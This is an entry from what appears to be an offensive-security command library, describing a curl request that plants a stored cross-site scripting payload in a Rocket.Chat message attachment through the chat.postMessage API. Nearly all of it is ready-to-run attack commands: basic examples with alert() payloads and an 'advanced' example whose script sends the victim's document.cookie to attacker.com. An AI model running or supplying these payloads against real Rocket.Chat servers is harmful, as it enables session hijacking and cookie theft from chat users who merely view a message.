---
data: >-
  curl -H "X-Auth-Token: <USER_TOKEN>" -H "X-User-Id: <USER_ID>"
  http://127.0.0.1:3000/api/v1/chat.postMessage -d
  "channel=<CHANNEL_NAME>&attachments[0][image_url]=/assets/logo&attachments[0][fields][0][title]=&attachments[0][fields][0][value]=<img
  src=/assets/logo width=1 height=1 onload=alert('XSS4') />You're Pwned!"
tags:
  - xss
  - injection
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 0a61f2e6-85b0-4076-9f31-4bb00a29d7cf
created_at: '2025-12-13T23:55:06.260Z'
updated_at: '2025-12-13T23:55:06.260Z'
verified: false
validated: true
submitted: true
---
# curl-rocket-chat-post-message-xss

## Command

```bash
curl -H "X-Auth-Token: <USER_TOKEN>" -H "X-User-Id: <USER_ID>" http://127.0.0.1:3000/api/v1/chat.postMessage -d "channel=<CHANNEL_NAME>&attachments[0][image_url]=/assets/logo&attachments[0][fields][0][title]=&attachments[0][fields][0][value]=<img src=/assets/logo width=1 height=1 onload=alert('XSS4') />You're Pwned!"
```

## Description

Posts a message to a Rocket.Chat channel with an attachment containing an XSS payload in the fields value, exploiting lack of HTML encoding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Custom headers for authToken and userId | Yes |
| `-d` | POST data with channel and attachments payload | Yes |
| `channel` | Target channel name | Yes |
| `attachments[0][image_url]` | URL to trigger rendering (e.g., /assets/logo) | Yes |
| `attachments[0][fields][0][value]` | XSS payload string | Yes |

## Examples

### Basic Usage

```bash
curl -H "X-Auth-Token: abc123" -H "X-User-Id: user456" http://127.0.0.1:3000/api/v1/chat.postMessage -d "channel=test&attachments[0][image_url]=/assets/logo&attachments[0][fields][0][title]=&attachments[0][fields][0][value]=<img src=/assets/logo onload=alert('XSS') />"
```

### Advanced Usage

With custom payload:

```bash
curl -H "X-Auth-Token: abc123" -H "X-User-Id: user456" http://127.0.0.1:3000/api/v1/chat.postMessage -d "channel=test&attachments[0][image_url]=/assets/logo&attachments[0][fields][0][value]=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
```

## Expected Output

JSON: {"success": true, "message": {"_id": "msg789...", ...}}

## Related

- [[commands/curl-rocket-chat-login]]
- [[procedures/Inject-XSS-via-chat.postMessage]]
